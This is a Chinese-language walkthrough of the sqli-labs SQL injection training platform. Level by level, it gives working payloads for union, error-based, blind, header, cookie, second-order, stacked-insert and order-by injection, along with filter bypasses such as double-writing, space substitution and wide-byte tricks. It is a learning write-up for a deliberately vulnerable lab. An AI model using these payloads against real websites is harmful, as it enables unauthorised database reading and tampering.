<center>sqli-labs</center>

此章主要讲述：在测试平台`sqli-labs`中通关的详情。和每关的收获

> `sqli-labs`是一个sql注入的测试平台，需要自己来搭建网站，就像是dvwa一样的

题目前有`*`的表示没做起。

两个`**`表示看的答案





### get基本注入



#### 1. 	union注入

最基本的sql注入，通过`union`注入的方式可以轻易的绕过

```
?id=-1' union select 1,2,3%23
```





猜测后端sql语句为

```
select username,password from users where id='前端传入数据' limit 0,1;
```



#### 2. 

在最初的基础上：没有用引号对变量进行选取。测试过程中，使用引号的话。将会引起报错。和上面基本类似，直接注入就行了。（ps.不用引号）

```
?id=-1 union select 1,2,3%23
```





猜测后端sql语句为：

```
select username,passwd from users where id = 前端传入的数据 limit 0,1;
```



#### 3.

在1的基础上加上了小括号对前端传入的数据进行包裹

```
?id=-1') union select 1,2,3 %23
```



猜测后端sql语句为：

```
select username,passwd from user where id = ('前端传入的数据') limit 0,1;
```

> 此处如果使用双引号进行闭合的话，不会起作用。会被单引号包裹，当成内容。



#### 4.	

此题和3题差不多。3题是单引号和小括号包裹前端传过来的数据。此题为双引号和小括号包裹前端传过来的数据

```
?id=-1") union select 1,2,3 %23
```



猜测后端 sql语句为：

```
select username,password from users where id=("前端传来的数据") limit 0,1;
```

> 如果此处尝试使用单引号闭合，不会起作用，会被当成内容。





#### 5.	报错注入

此题可以用盲注或者是报错注入。因为此题没有`union`注入所需的回显点，只有显示正常与否的页面，所以可以用盲注。又因为此题会报sql的错误信息回显。所以可以通过报错注入。



当然此题推荐报错注入，因为速度更快🐎😄

```
?id=1'and extractvalue(1,concat(0x7e,(select database())))%23
```



猜测后端sql语句为：

```
select * from users where id='前端传入的数据' limit 0,1;
```

> 注意此题不回显查到的数据，但回显sql报错语句。





#### 6.	

此题和第五题基本相同，不同的就是：5题是用单引号来包裹传入的数据，此题则是双引号包裹传入的数据

所以此题只需要把上面的payload中的单引号换成双引号就行了。





```
?id=1" and extractvalue(1,concat(0x7e,(select database())))%23
```

> 当然此题也能使用盲注



猜测后端sql语句为：

```
select * from users where id="前端传入的数据" limit 0,1;
```

> 此题不回显查询到的数据到前端，只会回显sql报错





#### 7.	(无解)*





#### 8.	bool盲注

很普通的盲注。因为sql错误的话，前端会改变，所以可以用bool注入。

要是心情好，也可以用时间盲注



```
?id=1' and length(database())>1 %23
?id=1' and substr((database()),1,1)='s' %23
```





猜测后端sql语句为：

```
select * from users where id ='前端传过来的值' limit 0,1;
```





#### 9.	时间盲注

此题为很普通的时间盲注。

> 其实此题作者算是减轻了难度，从接收的响应里面可以看到正常回显和不正常回显的响应长度是不一样的(ps.当然这里前端看不出来，可能被注释掉了。)

> 所以另一个方面说。此题作者减轻了难度，也可以用bool盲注



playload:

```
?id=1' and if(substr((database()),1,1)='s',sleep(2),1)%23
```



猜测后端sql语句：

```
select * from users where id='前端传来的数据' limit 0,1;
```





#### 10

此题和9题基本一样。只是后端sql语句选择了使用双引号`""`来包裹。而不是9题中的单引号



payload：

```
?id=1" and if(length(database())>1,sleep(1),1)%23
```



猜测后端sql语句：

```
select * from user where id="前端传来的数据"s limit 0,1;
```





### POST基本注入

#### 11.	post登录注入

遇到post的题应该最开始还是要进行信息探测：测试敏感字符

> POST

十题之前都是通过get方式来进行注入。

此题为通过登录的，post注入。





payloay

```
Username:1' or 1=1#
Password:任意
```

> 因为后面的密码被注释掉了，所以填任意都行。





猜测后端sql语句：

```
select * from users where username='前端传的数据' and password='前端传的数据' limit 0,1;
```





#### 12.

> POST

此题和11题基本相同。区别是：11题使用`'`单引号包裹数据，此题则是`"`双引号和`()`小括号包裹数据



payload：

```
Username:1") or 1=1#
Password:任意
```





猜测后端sql语句为：

```
select * from users where username=("前端数据") and password=("前端数据") limit 0,1;
```





#### 13.

此题和12题有基本相同。12题使用`"`双引号和`()`小括号包裹数据，此题则是通过`'`单引号和`()`小括号包裹数据



payload：

```
Username:') or 1=1#
Password:任意
```





猜测后端sql语句为：

```
select * from users where username=('前端数据') and password=('前端数据') limit 0,1;
```



#### 14.	

此题和11题基本类似。不同的在11题使用`'`单引号包裹数据，此题则是使用`"`包裹数据



payload:

```
Username:" or 1=1#
Password:任意
```





猜测后端sql语句：

```
select * from users where username="前端数据" and password="前端数据" limit 0,1;
```





#### 15.	post盲注

注意此题的目标不是用户登录，而是通过bool注入的手段拿到后端数据



此题和11题基本类似，但是此题不是用作登录。



payload:

```
Username:' or length(database())>1#
Password:任意
```

> 注意：此题虽然可以直接使用`'`打断，然后`or 1=1#`登录。但是此题的目标并不是登录

因为目标并不是登录，所以使用`or`来判断后面`bool`注入的内容是否成立







猜测后端sql语句：

```
select * from users where username='前端数据' and password='前端数据' limit 0,1;
```



#### 16.

此题和15题基本相同。区别在于15题使用`'`单引号包裹数据，而此题使用`"`双引号和`()`小括号包裹数据

> 此题的目标也是获取数据库信息，而不是登录



payload:

```
") or substr(database(),1,1)='s'#
```



猜测后端sql语句：

```
select * from users where username=("前端数据") and password=("前端数据") limit 0,1;
```





#### 17.*	update语句注入

> 此题看了一眼源码才过的！！！





此题为一道修改语句`update`的sql注入题。

通过报错注入`extractvalue`注入

​	简单说，后端的执行逻辑为：

1. 先`sql`查询输入的用户名`select`
2. 再根据查出来的用户名去修改`update`



其实这道题本身很简单，主要就在于你没想到他数据用户名的地方做了过滤。而输入新密码的地方没有过滤。

导致必须输入正确的用户名，例如:`dumb`。(ps.无法注入)

但是新密码则可以注入



payload：

```
								password reset
Username:dumb
NewPassword:1' where id=1 or extractvalue(1,concat(0x7e,(select database())))#
```





猜测后端sql语句：

```
查询用户：select * from users where username='前端传来的用户名' limit 0,1;
更新用户：update users set password='前端传来的用户新密码' where username='前面查询到的语句';
```



#### 18.User-Agent注入



此题为一道User-Agent注入题。其本质上是一道插入语句`insert into`的注入题



此题的大概思路是：因为后端会把`User-agent`记录进数据库。所以通过报错注入`User-Agent`就可以绕过



payload:

```
' or updatexml(1,concat(0x7e,(select database()),0x7e),1),'172.0.0.1','world')#
```

> 这里的payload，如果不输入正确密码的话是不能用的。

> 注意这里的`payload`是请求头中的User-Agent。

> 想要报错注入，首先得构造的语句本身不报错。此处的插入的数据有3条，所以一一对应着来。





猜测后端sql语句：

```
select * from users where username='前端传回数据' and password='前端传回数据' limit 0,1;

insert into uagents(uagent,ip_address,username) values('UA数据','ip数据','用户名')
```





#### 19.	refer注入

此题和18题基本类似，只是说18题是记录：`User-Agent`。而此题是记录`referer`，所以直接从`referer`中注入就好了

> 此处insert into 的字段只有两条。别问我怎么知道的，问就是探测。



在请求头中的`referer`中：

payload:

```
' or extractvalue(1,concat(0x7e,(select database()))),'321')#
```





猜测后端sql语句：

```
insert into referers(referer,ip_address) values('获取到的referer','获取到的ip');
```





#### 20.	cookie注入

> 此题为一道`cookie`注入的题。

注意：因为此题为一道cookie注入的题，而cookie是服务端返回前端的，所以登录用户后有一个重定向，所以抓包的时候注意一下。(ps.在重定向中才有cookie)



​	感觉像是重定向后，服务端从cookie中取：uname字段的值。然后进行select查询,查询用户名和密码。所以此处就有一个报错注入。







payload:

> cookie:中

```
uname=Dumb' or extractvalue(1,concat(0x7e,(select database()))) #
```





猜测后端sql语句：

```
select * from users where username='cookie的uname字段' limit 0,1;
```







#### 21.

此题和20题基本类似，同样都是cookie注入题。



区别在于：此题使用了base64编码。并且后端使用`'`单引号和`()`进行包裹。

> ps.base64的编码有多种算法，要找的话应该把cookie中加密的字符串。拿去解码的网站一个一个试，看解密再加密出来的字符串，是否和最初被加密过的字符串相同。



payload：

> cookie中：

```
uname=Jykgb3IgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSkpICNr
```

> 报错注入，弹出database()。[解密网站](http://www.bejson.com/enc/base64/)







猜测后端sql语句：

```
select * from users where username=('cookie解码得到的数据') limit 0,1;
```

> 此处对cookie做了base64编码处理



此题教会我们：同种编码有不同的算法，base64都有这么多种，更别说md5什么的了。大致确认是一种编码了后，可以换不同的算法试试。



#### 22.	



此题和21题基本相同。21题是单引号`'`和`()`小括号包谷，此题则是使用`"`双引号进行包裹。都是cookie注入题。

> 都是base64编码，解码得网站也是[同一个](http://www.bejson.com/enc/base64/)



payload:

> 在cookie中

```
uname=IiBvciBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpKSkj
```





猜测后端sql语句：

```
select * from users where username="cookie解码的uname数据" limit 0,1;
```

> 此处对cookie做了base64编码处理





### get绕过





#### 23.	注释绕过

> 此题为：注释绕过。在此题中所有得注释都被过滤掉：`#`,`--+`,`/*!*/`。

此题本身是`select`查询语句



通过`or`报错注入：使单引号前后互相闭合。但并不执行，而是执行`extractvalue()`中得内容



payload:

```
?id=-1' or extractvalue(1,concat(0x7e,(select database()))) or id='-1
```

> 通过闭合前后单引号，把`extract()`语句夹在中间，并且使用`or`执行`extractvalue()`







猜测后端sql语句：

```
select * from users where id='前端数据' limit 0,1;
```

> 此处对注释做了过滤处理





#### 24.	二次注入



此题为二次注入。简单说：在注册界面并不能注入，登录界面也不能注入，注入发生在修改密码的用户名。

通过注册用户名为`admin'#`，然后用此用户名去登录，然后修改用户名，修改用户名的sql语句并没有做过滤，导致用户名`admin'#`可以闭合并注释。导致可以修改管理员用户。(ps.没有对用户名进行转义)





> 此漏洞也发生在吴帝威的网站中，不过那是一个逻辑漏洞，而不是注入漏洞。但基本的思想都相似，注册一个和管理员用户名相同的用户名，当修改用户名的时候第一个找出来的是管理员用户，这样就可以修改了。(ps.原因是没有对注册的用户名检测是否已存在，而且修改密码是通过用户名去修改)





payload:

> 注册用户名为`admin'#`，这样就能闭合修改语句

```
									注册界面
Username:admin'#
password:任意
```







猜测后端对注册进行了转义过滤，对登录进行了转义，但对注册没有进行转义

```
修改用户密码的sql语句：
update users set password='前端出来的数据' where username='用户名';
```

> 此题注册做了转义处理，登录也做了转义处理，修改密码接收cookie中的uname值没做转义处理

> 此题修改密码的时候，也没有验证旧密码的正确性





#### 25.	双写绕过



此题主要为双写绕过：

后端对`and`,`or`,`&`做了过滤处理，会把以上字符全部替换为空字符。



如果是CTF题的话，没有说是被过滤了关键词。可以通过反复的测试来确认是否为双写绕过。

```
1' and 1=1%23
1' anandd 1=1%23			通过这种测试来，确认是否能用双写绕过
```

或者可以看一下`特殊的绕过`-->`双写绕过测试`



此时就可以使用双写绕过。例如：`or`写成`oorr`，`and`写成`anand`。这样中间的字符被替换为空后，两边的字符就会组成新的`or`或`and`



payload:

```
?id=1' anandd extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())))%23
```





猜测后端sql语句：

```
select * from users where username='前端传回的数据' limit 0,1;
```

> 后端对`or`,`and`,`&`做了过滤处理



#### 25.a



此题和`25`题，基本相同,都是关键词被过滤，使用双写绕过。只是mysql的具体报错信息，不会回显到前端了。所以不能使用报错注入。



题目说的是用bool注入，但是此题也可以union注入。所以此题使用union注入更加简单



payload:

```
?id=-1 union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),3%23
```







猜测后端sql语句：

```
select * from users where id=前端传来的数据 limit 0,1;
```





#### 26.*	绕过空格

总结：

绕过过滤空格的话，最好还是使用`()`。`()`几乎能独立的完成任务。当然或许有些地方还是需要其他的。

最标准的绕过空格的题是`27a`

> 这是后来总结的



---



> 注意此题中，我自己是只用了`+`和`(select+char(32))`。小括号`()`的想法是网上看的。小括号的终极payload是后来自己试出来了。
>
> 26a接替思路都差不多，这里就不概述了



此题过滤了`空格`，`注释`。但此题mysql的报错信息回显到了前端，所以可以使用报错注入。



在mysql中:`+`能在一些地方替代`空格`的作用，而`(select+char(32))`，此子句的返回值是`char()`函数

中的`ascii`对应值，也就是`空格`。而`()`中则能包含子查询，任何可以计算出结果的值都可以包含在括号中，而括号两端可以没有多余的空格。

> 三者相辅相成



采用`+`和`(select+char(32))`，还有`()`的组合就能替换掉空格和注释





payload:

```
?id=1'+(select+char(32))+extractvalue(1,concat(0x7e,(select+database())))+(select+char(35))+'
```

> 注意：上面的所有`+`都要url编码为`%2b`。否则表达的意思是空格

>  注意：此题，用我自己找到的解法貌似最多只能解到库名，再往下一步貌似是报错。







下面是我找到的终极payload

终极payload:

```
?id=1'+(select+char(32))+extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))))+(select+char(35))+'
```

> 注意所有的`+`都要替换为`%2b`，才能使用。













#### 26.a

> 此题的结题思路在`26`题中。有空的话自己看





此题是25题的升级，对`关键词and,or`,`(space)空格`,`#,--,/**/空格`，进行了过滤。

> 此题耗费了我不少的时间精力。



此题的主要绕过的思想就是：

1. `+`：表示连接，能在一些地方简单的代替`space`空格。(ps.当然，得使用`%2b`这种url编码才行，否则会被认为是空格)
2. `(select+char(32))`：通过`char()`函数得子查询能返回ascii码对应的字符。`空格`和`#`就是这样绕过



payload:



+ bool注入：

```
?id=1'+(select+char(32))anandd+(select+char(32))+length(database())>1+(select+char(35))+'
```

> 注意，上面的payload要使用的话，需要把所有的`+`换成`%2b`

> 此处的bool注入有点问题，不能正常的回显。所以建议使用时间盲注





时间盲注：

`%2b`是url转码后的`+`，`%27`是转码后的`'`单引号



> 测database()长度

```
?id=1%27%2b(select%2bchar(32))anandd%2b(select%2bchar(32))%2bif(length(database())=8,sleep(0.1),1)%2b(select%2bchar(35))%2b%27
```



> 猜解database()

```
?id=1%27%2b(select%2bchar(32))anandd%2b(select%2bchar(32))%2bif(substr((select%2bdatabase()),1,1)=%27s%27,sleep(0.1),1)%2b(select%2bchar(35))%2b%27
```

> 因为如果时间`sleep(1)`的话，都会等待15秒，所以调成`sleep(0.1)`。





此payload简单说，就是一个盲注。

>  (ps.也可使用时间盲注，不过时间盲注`sleep(1)`需要等15秒)

+ `+`：表示连接作用，能比较片面的代替`(space)空格`
+ `(select+char(32))`：表示空格。通过`select`子句来返回一个：ascii码为`32`的字符。同理`(select+char(35))`表示的是`#`。
+ `anandd`：通过双写绕过来绕过对敏感词的过滤。





#### 27.	绕过空格

> 此题相对来说没花什么时间。

> 此题对：`+(也就是%2b)`，`空格`,`注释`,`关键词`,进行了过滤处理



此题中：`and`和`or`，没有被过滤。

+ `select`和`union`使用大小写绕过。

+ 使用`<>`来代替`+`

+ 使用`<>`和`()`和`(select(char(32)))`来一起代替括号的作用







其他的和第26题基本不变。



payload:

```
?id=1'and(extractvalue(1,concat(0x7e,(SeLeCt(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))))or'
```







猜测后端sql语句：

```
select * from users where id='前端数据' limit 0,1;
```

> 重要的不说猜测后端sql语句。而是如何绕过过滤规则





#### 27.a

此题主要是，对上题`27`做的改进。页面不再回显mysql错误。这样就只能用盲注才能进行绕过

此题包括：

+ 关键词过滤：大小写绕过
+ 空格过滤：使用`<>`和`=`和`()`代替
+ 



同时此处对上题做补充：

+ `<>`在上题中代替了`空格`的作用，但实质上还是不等于的含义



payload:

简单猜当前库长度

```
1"and(substr((database()),1,1)='s')="1
```

> 其实质上是：通过`and`分隔语句，使`and`后面构造出一个等式，并通过判断等式是否相等来盲注。



猜表名

```
?id=1"and(substr((SeLeCt(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1)='s')="1
```

> 此处通过`=`来判断整体是否相等，





猜测后端sql：

```
select * from users where id="前端传来的数据" limit 0,1;
```





#### 28.

> 此题和27题基本相似，只是27题包裹数据是用`""`双引号进行包裹。而此处是用`('')`进行包裹。



基本的注入思想都相同。



不懂的话，详情看27题



payload:

```
?id=1')and(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1)='s')=('1
```

> 此题的payload和27题只有闭合的符号不一样。





猜测后端sql语句：

```
select * from users where id=('前端传来的数据') limit 0,1;
```







#### 28.a



> 莫名奇妙的此题很简单，可能是接下来的题要开始难了。



此题只做了过滤一个关键词`union select`。甚至分别的`union`和`select`都没有做过滤。

所以此题可以`union`注入(ps.双写绕过)，盲注，报错注入。



此题我直接就用`union`注入了，顺便测试一下过滤性。





payload:

```
?id=-1')union union select select 1,2,3%23
```

> 后买你更详细的注入步骤就不写了，毕竟只做了`union select`的过滤





猜测后端sql语句：

```
select * from users where id=('前端传回的数据') limit 0,1;
```







#### 29.	绕过waf



此题一共有三个页面，分别是`index.php`,`login.php`,`hacked.php`。其中`login.php`和`hacked.php`是一对。`index.php`是独立的。(ps.我没懂这题为什么这样做)

> index.php很简单就绕过了。所以我认为他不是真正要进行waf绕过的题。实际的题，以`login.php`为准



​		此题绕过使用`HTTP`参数污染。

当一参数出现多次的时候不同的中间件会有不同的解析结果。这样就可以绕过。

> (ps.详情见web安全攻防186页)



payload:

```
?id=1&id=-1' union select 1,(select database()),3%23
```







猜测后端sql语句：

```
select * from users where id="前端传来的数据" limit 0,1;
```

> 此处的同一参数出现多次。中间件只执行了最后一次





#### 30.



此处用的是和上面完全相同的用法……。只是29题是用`'`单引号包裹，此处是用`"`双引号包裹



payload:

```
?id=1&id=-1" union select 1,(select database()),3%23
```











#### 31.



此题整体的思想和29，30题都差不多。都同样是用HTTP参数过滤。



此题的不同之处在于：貌似过滤的单引号。但此题会把sql报错信息输出到前台，所以此题可以用报错注入





payload:

```
?id=1&id=2"and extractvalue(1,concat(0x7e,(select database())))="1
```









猜测后端sql语句：

```
select * from users where id="前端出来的数据" limit 0,1;
```







#### 32.	宽字节绕过



此题过滤了`'`单引号，但是后端就是用`'`单引号做闭合的。测试`%bf`发现有用



所以此处使用宽字节注入。





payload:

```
?id=-1%bf' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3%23
```

> 此处由于单引号被转义，所以表达`where`子句就用十六进制表示即可







猜测后端sql语句：

```
select * from users where id='前端传来的数据' limit 0,1;
```







#### 33.

> 感觉绕过空格后面的题都是奇奇怪怪的

此题不知为什么感觉和32题完全一摸一样。而且title都一样，进入33题还会有一个跳转。





payload:

```
?id=1%bf' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)))%23
```







猜测后端sql语句：

```
select * from users where id='前端出来的数据' limit 0,1;
```



不过貌似看标题，此题是绕过加号。

不懂什么意思，如果加号表示空格的话。这题`%20`页能正常表示空格。绕过的是加号的话`%2b`也能正常的表示加号。

但是加号本身却被过滤。`url`里面输入`+`加号被过滤掉了





#### 34.	** post

post类型的宽字节注入



此题的盲点在于：我们平常用宽字节注入的时候都是用get注入的`%bf`。此东西会和`\`宽字节编码为另一个字符。而在url中输入`%bf`后端是会解码一次的。也就是说后端并不是`%bf`和`\`组成的字符而是`%bf`解码后的字符，和`/`再组成了新的字符。`%bf`解码后为`�`



而此题中因为是`post`方式，所以后端不会进行一次url解码。所以我们应该输入的不是`%bf`而是`�`。





payload:

```
username:1�' and extractvalue(1,concat(0x7e,(select database())))#
password:任意
```





猜测后端sql语句：

```
select * from users where username='前端数据' adn password='前端数据' limit 0,1;
```





#### 35.



此题和33题没有什么区别，只是此题并没有使用`'`,`"`，`()`什么的包裹数据。所以直接注就行了，不需要闭合。注入也不要用`'`单引号





payload:

```
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)))#
```







猜测后端sql语句：

```
select * from users where username=前端传的数据 limit 0,1;
```





#### 36.



此题大概的解题思路就是简单的：宽字节注入





payload:

```
?id=1%bf' and extractvalue(1,concat(0x7e,(select database())))%23
```







#### 37.post



此题和34题几乎一摸一样，



同样是POST类型的宽字节注入，把`%bf`替换为`�`





payload:

```
?id=1�' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)))#
```





猜测后端sql语句：

```
select * from users where username='前端数据' and password='前端数据' limit 0,1;
```





#### 38

> 没太懂这道题





就很简单的注入就完事了，估计各种方式都能用，不过我用的还是报错注入



payload:

```
?id=1' and extractvalue(1,concat(0x7e,(select database())))%23
```







猜测后端sql语句：

```
select * from users where id = '前端传的数据' limit 0,1;
```





### 堆叠注入

> 38题就是上面那道题





#### 39.



此题没有使用`'`,`"`,`()`进行包裹。很简单的就能注入。

但是通关并不是这个，而是堆叠。

所以此处使用堆叠注入，为了能看到堆叠注入的成功与否。此处使用insert语句





payload:

```
?id=1; insert into users values(27,'a','a');%23
```

> 获取`users`表的表名很简单，此处就直接用了





猜测后端sql语句：

```
select * from users where id=前端传来的数据 limit 0,1;
```







#### 40.

此题与39题及其类似。

基本过程都差不多，不过此题使用`'`和`()`包裹数据

而且此题中。mysql的报错信息不会回显，所以不能使用报错注入。可以使用union注入和盲注，和堆叠

>  所以查询表结构使用union，添加数据用堆叠



payload:

```
?id=1');insert into users values(29,'b','b');%23
```

> `union`获取users表名就不写了，很简单



猜测后端sql语句：

```
select * from users where id=('前端传来的数据') limit 0,1;
```





#### 41.



此题和40题及其相似：只是此题没有`'`和`()`包裹数据。

> 所以此题使用union注入探查表结构。使用堆叠来插入数据





payload:

```
?id=1; insert into users values(32,'d','d')%23
```

> 使用union来探查表结构就不说了





猜测后端sql语句：

```
select * from users where id=前端传来的数据 limit 0,1;
```







#### 42.	post

此题为POST类型的堆叠注入。

> 通关条件为堆叠插入一条数据



此题注入点在密码。用户名不可注入，该过滤的都过滤掉了



先通过报错注入爆表名和字段名，再通过堆叠注入插入数据



payload:

> 爆表名，字段名

```
username:任意
password:1'and extractvalue(1,concat(0x7e,(select database())))#
```



> 插入数据

```
username:任意
password:1'; insert into users values(34,'d','d');#
```







猜测后端sql：

```
select * from users where username='前端数据' and password='前端数据' limit 0,1;
```





#### 43.

此题和42题基本相似 ，只是42题采用`'`单引号闭合，此题使用`'`和`()`闭合。



与42题相似，此题爆表结构使用报错注入，插入数据使用堆叠注入。



payload:



> 爆表结构

```
username:任意
password:1') and extractvalue(1,concat(0x7e,(select database())))#
```



> 插入数据

```
username:任意
password:1');insert into users values(36,'g','g');#
```





猜测后端sql语句：

```
select * from users where username=('前端数据') and password=('前端数据') limit 0,1;
```

> 此处用户名被过滤了，用户密码未被过滤





#### 44. 堆叠盲注



> 此题做错了。这题很有意思。惯性思维会导致这题出错。我看到网上的不少人都做错了这道题。

> 根据作者的题意，此题应该是叫登录，当然我们肯定不止这样做。



此题的精妙之处就在于：完全没有报错信息，只有登录成功与否。而且已经写了四十多道题，我们已经很清楚数据库中有哪些表，而密码中又有一个`'`单引号闭合的注入点。所以很多人都选择了直接通过堆叠直接新增数据，然后让自己能够登录。

​	但是问题来了，`sqli-labs`是一套模拟题，这题我们应该是作为黑客的角度来看题，黑客当然不知道数据库中有哪些表，所以就算知道有单引号闭合的注入漏洞，也不能就直接的新增数据。

​	所以此题应该先用盲注来获取数据库结构。





payload

> 盲注爆表。注意：此处只能使用bool盲注，不能使用时间盲注。因为是`or`，盲注的话会阻塞

```
username:任意
password:1' or substr((database()),1,1)='s'#				ps.具体的猜解步骤就不写了
```

> 此处如果猜对的话直接就是登录成功。当然如果是登录的话：`1'or 1=1#`更简单





> 得到表名`users`后

```
username:任意
password:1';insert into users values(42,'rr','rr')#
```









猜测后端sql语句：

```
select * from users where username='前端数据' and password='前端数据' limit 0,1;
```

> 密码处未过滤





#### 45.



此题的大致解法和44题一样，只是44题使用`'`单引号闭合。此题使用`()`小括号,`'`单引号闭合







payload:

> 盲注报表

```
username:任意
password:') or substr((database()),1,1)='s'#
```





> 插入数据

```
username:任意
password:');insert into users values(43,'gg','mm');#
```





#### 46. order by 注入



此题为`order by`类型的注入。

> 搜索全表的数据，并且通过指定字段来排序。(ps.也就是`order by`)



因为此题会回显mysql错误信息。所以此题使用报错注入



payload:

```
?sort=1 and extractvalue(1,concat(0x7e,(select database())))%23
```







猜测后端sql语句：

```
select * from users order by 前端传来的数据 ;
```







#### 47.



此题和46题差不多，mysql报错都会回显到前端。只是46题数据没有被包裹，而此题的数据使用`'`单引号进行包裹



payload:

```
?sort=1' and extractvalue(1,concat(0x7e,(select database())))%23
```







猜测后端sql语句：

```
select * from users order by '前端数据';
```





#### 48.	rand()解决orderby





此题学习网上的经验使用`rand()`的方法来解决此题。

​	

​	首先简单了解一下`rand()`函数。

> ​	此函数是一个产生随机数的函数。如果`order by`通过此函数来排序的话，每次排出来的都是随机顺序

> ​	但是如果`rand()`函数中有一个固定值的话，那么此函数的返回值也会是一个固定值。
>
> ​			例如：rand(1)=0.40540353712197724。
>
> ​					当然，rand(true)也是这个值

> 因为`order by rand(固定值)`排序，排出来的顺序也是相同的，于是乎就可以通过整体排序的顺序来判断`rand()`函数参数中的bool值了。



于是乎就可以通过`rand()`函数来做bool注入 







payload:

```
?sort=rand(ascii(substr((database()),1,1))=65) limit 0,5%23
```

> 因为`rand()`和`limit`的原因。此处错误返回的数据，和正常返回的数据是不一样的。

因为`rand()`函数，如果其中参数是确定值得话，他也会返回确定值。

例如：

```
rand(1)和rand(1)是一样得返回值。无论执行几次返回值都是0.40540353712197724
```





猜测后端sql语句：

```
select * from users order by 前端数据;
```





#### 49.	

> order by 注入

> 此题和48题较为类似。但是很奇怪此题无论`sort`参数传入什么值，都只会默认排序。



但是此题因为有`'`单引号包裹，所以貌似不能用`rand`来解决，所以只能通过时间盲注



payload:

```
?sort=1' and if(length(database())>1,sleep(0.1),1)%32
```

> 此处`sleep()`函数中每增加一秒，实际时间增加30秒。

此题如果想用`or`的话，前面就不能传数据

例如：

```
?sort=' or if(length(database())>1,sleep(0.1),1)%23
```



猜测后端sql语句：

```
select * from users order by '前端数据';
```





#### 50.

> order by注入

>  此题不知道用意在哪。很简单

因为mysql报错信息会回显，所以可以直接用报错注入来猜解表名。又可以用堆叠注入来插入数据。



payload:

> 爆库名

```
?sort=1 and extractvalue(1,concat(0x7e,(select database())))%23
```





> 插入数据：

```
?sort=1;insert into users values(45,'hh','hh');%23
```







#### 51.



此题和50题极为相似，也很简单。只是50题没有用符号包裹数据，而此题使用`'`单引号包裹数据。





payload:

> 报错注入，爆数据库结构

```
?sort=' and extractvalue(1,concat(0x7e,(select database())))%23
```





> 堆叠插入数据

```
?sort=1';insert into users values(46,'wss','wss');%23
```











#### 52.



此题和48题极为相似。可以说是一样的了。

同样先用`rand()`函数来猜解表结构



此题没有用符号包裹数据



payload:

> rand()函数盲注表结构。

```
?sort=rand(length(database())>1) limit 0,3%23
```



> 堆叠插入数据

```
?sort=1;insert into users values(47,'pp','pp');%23
```





#### 53.



此题和49题完全一摸一样。



都是`order by`，都是`'`包裹数据。都只能盲注，因为没有mysql错误回显





payload:

> 时间盲注爆表结构

```
?sort=1' and if(length(database())>1,sleep(0.1),1)%23
```







> 堆叠插入数据

```
?sort=1';insert into users values(49,'tf','tf')%23
```





### 挑战



#### 54.



此题还蛮有意思的。相比较题而言更像是一个挑战。

通过get方式传输`id`参数注入，最后将获取的的flag输入下方的提交框。

每试十次，表名，列名，表中数据都会改变。所以需要尽快的注入。我大概在第二轮的第三次得到flag。



payload:

使用`'`单引号闭合。通过union注入获取表数据

> 注意：因为每次的表名都会重置，所以此处的payload需要改动一下才能直接用

> union注入获取表名

```
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3%23
```



> union注入获取字段名

```
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x此处为十六进制表名),3%23
```



> union注入获取表数据

```
?id=-1' union select 1,(select group_concat(id,sessid,secret_HUWX,tryy) from 表名),3%23
```



> flag在第三个字段。接下来获取到的flag填到输入框就好了。





